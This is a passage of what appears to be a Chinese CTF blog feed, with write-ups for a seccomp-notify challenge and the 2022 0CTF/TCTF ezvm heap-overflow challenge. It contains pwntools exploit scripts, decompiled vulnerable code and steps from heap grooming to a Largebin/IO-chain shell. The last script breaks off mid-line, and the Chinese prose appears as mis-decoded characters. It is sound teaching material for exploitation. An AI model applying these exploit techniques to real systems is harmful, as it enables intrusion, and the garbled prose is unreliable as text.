class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># solve.py</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> os<br><br>os.system(<span class="hljs-string">&#x27;gcc ./payload.c -shared -Wl,--version-script,payload.map -o ./payload&#x27;</span>)<br>os.system(<span class="hljs-string">&#x27;gcc ./exploit.c -o ./exploit&#x27;</span>)<br><br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./exploit&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>r = remote(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,<span class="hljs-number">9000</span>)<br>r.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(f)))<br>time.sleep(<span class="hljs-number">1</span>)<br>r.send(f)<br>f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./payload&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br><br>r.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(f)))<br>time.sleep(<span class="hljs-number">1</span>)<br>r.send(f)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p>æ•´ä½“æ€æƒ³è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œé€šè¿‡ <code>SECCOMP_IOCTL_NOTIF_ADDFD</code> å»åŠ«æŒ openatï¼Œè¿”å›æˆ‘ä»¬çš„æ¶æ„ payloadï¼Œå®ç°ç±»ä¼¼ <code>LD_PROLOAD</code> çš„æ•ˆæœã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221019165240559.png" alt="image-20221019165240559"></p><h2 id="jsy-5-solves-Workingâ€¦"><a class="header-anchor" href="#jsy-5-solves-Workingâ€¦">Â¶</a>jsy(5 solves)(Workingâ€¦)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20221016122254774.png" alt="image-20221016122254774"></p><h2 id="å‚è€ƒé“¾æ¥"><a class="header-anchor" href="#å‚è€ƒé“¾æ¥">Â¶</a>å‚è€ƒé“¾æ¥</h2><h3 id="Readable"><a class="header-anchor" href="#Readable">Â¶</a>Readable</h3><ul><li><p><a href="https://github.com/justcatthefish/justctf-2022/tree/main/challenges/pwn_dumpme">JustCTF2022 - pwn_dumpme</a></p></li><li><p><a href="https://linux.die.net/man/8/ld.so">ld.so æ–‡æ¡£ - man</a></p></li><li><p><a href="https://www.kernel.org/doc/Documentation/prctl/no_new_privs.txt">PR_SET_NO_NEW_PRIVS</a></p></li><li><p><a href="http://just4coding.com/2022/04/03/seccomp/">Seccompæœºåˆ¶ä¸seccomp notifyä»‹ç» - Just For Coding</a></p></li><li><p><a href="https://brauner.github.io/2020/07/23/seccomp-notify.html">The Seccomp Notifier - New Frontiers in Unprivileged Container Development</a></p></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2022 0CTF/TCTF éƒ¨åˆ†èµ›é¢˜è§£</title>
    <link href="/posts/ca1d58fb.html"/>
    <url>/posts/ca1d58fb.html</url>
    
    <content type="html"><![CDATA[<blockquote><p>glibc å°å°åšé¢˜å®¶ï¼Œä»€ä¹ˆæ—¶å€™æ‰èƒ½å’Œå¤§å¸ˆå‚…ä»¬ä¸€æ ·å®¡æºç ç§’é¢˜å‘œå‘œå‘œ ( á—œ Ë° á—œ )</p></blockquote><p>æˆ‘åœ¨æ¯”èµ›ä¸­åªåšå‡ºäº† BabyHeap å’Œ ezvmï¼Œå…¶ä»–é¢˜è¿˜åœ¨å¤ç°ï¼ˆæ²¡å’•çš„è¯ï¼‰ã€‚</p><h2 id="babyheap2022ï¼ˆ35-Solvedï¼‰"><a class="header-anchor" href="#babyheap2022ï¼ˆ35-Solvedï¼‰">Â¶</a>babyheap2022ï¼ˆ35 Solvedï¼‰</h2><p>2.35 çš„å †æº¢å‡ºï¼Œæ´’æ´’æ°´å•¦ã€‚</p><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220920122906462.png" alt="babyheap2022"></p><h3 id="é¢˜ç›®æè¿°"><a class="header-anchor" href="#é¢˜ç›®æè¿°">Â¶</a>é¢˜ç›®æè¿°</h3><p>Hooks are wiped.</p><p>Pointers are mangled.</p><p>Skills are to be replenished.</p><p><a href="https://drive.google.com/file/d/1iC36vnQ8DgE7dTV7jinWOU4SiG-W4mVp/view?usp=sharing">babyheap</a></p><p>Update: The file is updated to include the running environment.</p><h3 id="æ€è·¯"><a class="header-anchor" href="#æ€è·¯">Â¶</a>æ€è·¯</h3><p>ä¸€æ¬¡æ‰“ fskeyï¼Œä¸€æ¬¡æ‰“ tls_dtor_listï¼Œæ¯”è¾ƒç®€å•ï¼Œä¸æ”¾ exp äº†=.=</p><p>å¯ä»¥çœ‹çœ‹ <a href="https://ctftime.org/event/1717/tasks/">ctftime</a> ä¸Šå…¶ä»–å¸ˆå‚…å†™çš„ã€‚</p><h2 id="ezvm-29-Solved"><a class="header-anchor" href="#ezvm-29-Solved">Â¶</a>ezvm(29 Solved)</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220920121121665.png" alt="ezvm"></p><h3 id="é¢˜ç›®æè¿°-v2"><a class="header-anchor" href="#é¢˜ç›®æè¿°-v2">Â¶</a>é¢˜ç›®æè¿°</h3><p>Enjoy a game with virtual machine!</p><p><a href="https://drive.google.com/file/d/1zJzZSx_fCxgTnOXwaDpsmtztBSohXkFU/view?usp=sharing">attachment</a></p><h3 id="é¢˜ç›®åˆ†æ"><a class="header-anchor" href="#é¢˜ç›®åˆ†æ">Â¶</a>é¢˜ç›®åˆ†æ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">do_things</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int64 size; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">void</span> *a1; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span><br>  <span class="hljs-type">unsigned</span> __int64 a4; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">void</span> *a2; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  write_n(<span class="hljs-string">&quot;Please input your code size:&quot;</span>);<br>  size = try_LONG();<br>  <span class="hljs-keyword">if</span> ( size &gt;= <span class="hljs-number">0x200</span> )<br>    Error(<span class="hljs-string">&quot;too much!&quot;</span>);<br>  a1 = <span class="hljs-built_in">malloc</span>(size);<br>  <span class="hljs-keyword">if</span> ( !a1 )<br>    Error(<span class="hljs-string">&quot;malloc failed!&quot;</span>);<br>  write_n(<span class="hljs-string">&quot;Please input your memory count:&quot;</span>);<br>  a4 = try_LONG();<br>  <span class="hljs-keyword">if</span> ( a4 &gt;= <span class="hljs-number">0x200000000000000</span>LL )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( !only_chance )<br>      Error(<span class="hljs-string">&quot;bye bye! bad hacker!&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;OK, only one chance.&quot;</span>);<br>    only_chance = <span class="hljs-number">0</span>;<br>  &#125;<br>  a2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span> * a4);                          <span class="hljs-comment">// overflow</span><br>  <span class="hljs-keyword">if</span> ( !a2 )<br>    Error(<span class="hljs-string">&quot;malloc failed!&quot;</span>);<br>  write_n(<span class="hljs-string">&quot;Please input your code:&quot;</span>);<br>  read_n((__int64)a1, size);<br>  vm_init(a1, a2, size, a4);<br>  vm_run();<br>  vm_free();<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">vm_run</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> __int8 v1; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v2; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v3; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 v4; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">unsigned</span> __int8 reg_id; <span class="hljs-comment">// [rsp+3h] [rbp-2Dh]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+4h] [rbp-2Ch]</span><br>  __int64 v7; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  __int64 mem_id; <span class="hljs-comment">// [rsp+8h] [rbp-28h]</span><br>  <span class="hljs-type">void</span> *v9; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  __int64 v10; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  __int64 v11; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  __int64 v12; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br><br>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">2</span> )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( vm_ip &lt; Code_size )<br>    &#123;<br>      v6 = (<span class="hljs-type">char</span>)CODE[vm_ip++];<br>      <span class="hljs-keyword">switch</span> ( v6 )<br>      &#123;<br>...<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">20</span>:<br>          v3 = CODE[vm_ip];<br>          v9 = *(<span class="hljs-type">void</span> **)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( v3 &gt;= <span class="hljs-number">4u</span> )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)v3 + <span class="hljs-number">4</span>) = v9;<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">21</span>:<br>          v4 = CODE[vm_ip];<br>          v7 = *(_QWORD *)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( v4 &gt; <span class="hljs-number">3u</span> || v7 &lt; <span class="hljs-number">0</span> || v7 &gt;= Memory_size )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *((_QWORD *)Memory_ptr_while_regs + v7) = *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)v4 + <span class="hljs-number">4</span>);<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">22</span>:<br>          reg_id = CODE[vm_ip];<br>          mem_id = *(_QWORD *)&amp;CODE[++vm_ip];<br>          vm_ip += <span class="hljs-number">8LL</span>;<br>          <span class="hljs-keyword">if</span> ( reg_id &gt; <span class="hljs-number">3u</span> || mem_id &lt; <span class="hljs-number">0</span> || mem_id &gt;= <span class="hljs-number">8</span> * Memory_size / <span class="hljs-number">8</span> )<br>            Error(<span class="hljs-string">&quot;oveflow!&quot;</span>);<br>          *(&amp;Memory_ptr_while_regs + (<span class="hljs-type">char</span>)reg_id + <span class="hljs-number">4</span>) = (<span class="hljs-type">void</span> *)*((_QWORD *)Memory_ptr_while_regs + mem_id);<br>          <span class="hljs-keyword">continue</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">23</span>:<br>          <span class="hljs-keyword">return</span> write_n(<span class="hljs-string">&quot;finish!&quot;</span>);<br>        <span class="hljs-keyword">default</span>:<br>          write_n(<span class="hljs-string">&quot;what???&quot;</span>);<br>          <span class="hljs-keyword">continue</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> write_n(<span class="hljs-string">&quot;finish!&quot;</span>);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å®ç°äº†ä¸€ä¸ªå¸¦å †ç©çš„è™šæ‹Ÿæœºï¼Œç»™äº†ä¸€æ¬¡æº¢å‡ºæœºä¼š</p><p>å…¶ä»–çš„åŠŸèƒ½æ¯”è¾ƒæ­£å¸¸ï¼Œå°±æ˜¯å¼€è¾Ÿçš„è™šæ‹Ÿæœºå¯„å­˜å™¨å’Œæ ˆä¹‹é—´çš„ä¸€äº›åŠ å‡ä¹˜é™¤ä½è¿ç®—æ¯”å¤§å°è¿™äº›å¸¸è§„æ“ä½œã€‚</p><p>éœ€è¦æ³¨æ„çš„é—®é¢˜ï¼š</p><ol><li>æ¯æ¬¡å †å—ç”³è¯·çš„é¡ºåºæ˜¯ CODEã€Memoryã€Stackï¼Œé‡Šæ”¾é¡ºåºæ˜¯ Memoryã€CODEã€Stackï¼ŒStack å¸¸è§„æƒ…å†µä¸‹éƒ½ä¼šä¸ Top Chunk åˆå¹¶</li><li>æº¢å‡ºç»“åˆ <code>case 21</code> å¯ä»¥é€ æˆå †ä¸Šä»»æ„å†™ã€‚ç”±äºåˆ¤æ–­æ˜¯ <code>mem_id &gt;= 8 * Memory_size / 8</code> ï¼Œæƒ³åˆ©ç”¨ <code>case 22</code> è¶Šç•Œè¯»æ˜¯ä¸è¡Œçš„ =.=</li><li>å¦‚æœç”³è¯·çš„å †å—å¤§å°æº¢å‡ºåå¤§äº <code>0x200000</code>ï¼Œåˆ™å¯ä»¥åœ¨ libc ä¸Šè¶Šç•Œå†™</li></ol><h3 id="æ€è·¯ä¸€-Master-of-Glibcï¼ˆbushiï¼‰"><a class="header-anchor" href="#æ€è·¯ä¸€-Master-of-Glibcï¼ˆbushiï¼‰">Â¶</a>æ€è·¯ä¸€ Master of Glibcï¼ˆ<s>bushi</s>ï¼‰</h3><p>æ€è·¯ä¸€æ˜¯æˆ‘æ¯”èµ›æ—¶çš„æ€è·¯ï¼Œï¼ŒæŒºå¤æ‚çš„ï¼Œè€Œä¸”æ…¢ã€‚å½“æ—¶ç¡®å®æ²¡æƒ³åˆ°ä»€ä¹ˆå¥‡å¥‡æ€ªæ€ªçš„ç®€å•æ–¹æ³•ï¼Œå°±ç›´æ¥ä¸€è‚¡è„‘å¾€ä¸‹åšäº†ï¼Œå †é£æ°´è°ƒäº†å¾ˆé•¿æ—¶é—´qwqï¼Œæ²¡æœ‰æƒ³åˆ°èµ° mmap åˆ†é…åˆ° libc ä¸Šé¢è¿™æ ·å­ã€‚</p><ol><li>åˆ©ç”¨æ¯æ¬¡ç”³è¯·çš„ code size ä¸åŒï¼Œå¸ƒç½®å †é£æ°´ã€‚åˆ©ç”¨ä¸€æ¬¡æº¢å‡ºï¼ŒåŒæ—¶å¸ƒç½®å‡ ä¸ªsizeï¼Œç¡®ä¿ free ä¸ä¼šå‡ºé”™ï¼Œå¹¶æ„é€ å †å—é‡å ï¼ŒåŒæ—¶å¸ƒç½®å¥½ä¸€ä¸ª Largebin å’Œä¸€ä¸ª Unsortedbinã€‚</li><li>å †å—é‡å åï¼Œè¯»å– libc åœ°å€å’Œ heap åŸºå€ï¼Œé€šè¿‡å¯„å­˜å™¨å…¥æ ˆï¼Œæ ˆé‡Œè®¡ç®—å†å‡ºæ ˆï¼Œå¯„å­˜å™¨é€å…¥ memory ä¸€ç³»åˆ—æ“ä½œï¼Œä¿®æ”¹ Largebin çš„ bk ä¸º <code>_IO_list_all - 0x20</code>ï¼Œç„¶åå¸ƒç½®å¥½ IO é“¾å­å·´æ‹‰å·´æ‹‰ï¼Œæœ€å exit getshell</li></ol><h4 id="Exp"><a class="header-anchor" href="#Exp">Â¶</a>Exp</h4><p>äº¤äº’éƒ¨åˆ†æ˜¯æŠ„çš„å¤§å¸ˆå‚…çš„ï¼Œæ•´ç†äº†è‡ªå·±æ¯”èµ›æ—¶å€™çš„æ€è·¯ï¼Œç¨å¾®å¥½çœ‹ç‚¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ezvm&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment"># p = process(&#x27;./ezvm&#x27;)</span><br>p = remote(<span class="hljs-string">&quot;&quot;</span>,)<br><br>pc = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">push</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pop</span>(<span class="hljs-params">regIdx</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">2</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">1</span>)+p8(regIdx)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">2</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">sub</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">3</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">4</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">7</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rshift</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">8</span>)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">And</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">9</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jmp</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xe</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jnz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xf</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">jz</span>(<span class="hljs-params">offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">9</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x10</span>)+p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">eq</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x11</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mov</span>(<span class="hljs-params">regIdx,imm</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x14</span>) + p8(regIdx) + pack(imm)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">store</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x15</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">regIdx,offset</span>):<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">10</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x16</span>) + p8(regIdx) + p64(offset)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">halt</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0x17</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">other</span>():<br>    <span class="hljs-keyword">global</span> pc<br>    pc += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> p8(<span class="hljs-number">0xff</span>)<br><br><span class="hljs-comment"># Take from code below</span><br>main_arena_d96 = <span class="hljs-number">0x7ffff7fa5ce0</span><br>TARGET = <span class="hljs-number">0x000055555555a4c0</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write_libc_addr</span>(<span class="hljs-params">Mem_idx,Addr</span>):<br>    <span class="hljs-keyword">return</span> push(<span 